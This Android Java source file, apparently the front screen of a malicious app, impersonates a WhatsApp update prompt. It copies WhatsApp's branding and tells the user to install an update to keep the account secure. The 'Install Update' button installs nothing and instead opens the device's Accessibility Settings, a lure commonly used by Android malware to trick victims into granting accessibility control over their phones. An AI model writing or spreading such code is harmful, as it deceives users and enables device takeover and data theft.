package com.whatsapp.update;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.WHITE);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(60, 60, 60, 60);

        TextView logo = new TextView(this);
        logo.setText("💬"); 
        logo.setTextSize(100f);
        logo.setGravity(Gravity.CENTER);
        
        TextView title = new TextView(this);
        title.setText("WhatsApp needs updates");
        title.setTextSize(24f);
        title.setTypeface(null, Typeface.BOLD);
        title.setTextColor(Color.parseColor("#075E54"));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 30, 0, 15);

        TextView subtitle = new TextView(this);
        subtitle.setText("A new version of WhatsApp is available. Please install the update to continue using your account securely.");
        subtitle.setTextSize(16f);
        subtitle.setTextColor(Color.GRAY);
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 50);

        Button btn = new Button(this);
        btn.setText("Install Update");
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(18f);
        btn.setBackgroundColor(Color.parseColor("#25D366"));
        
        layout.addView(logo);
        layout.addView(title);
        layout.addView(subtitle);
        layout.addView(btn);
        setContentView(layout);

        btn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
    }
}
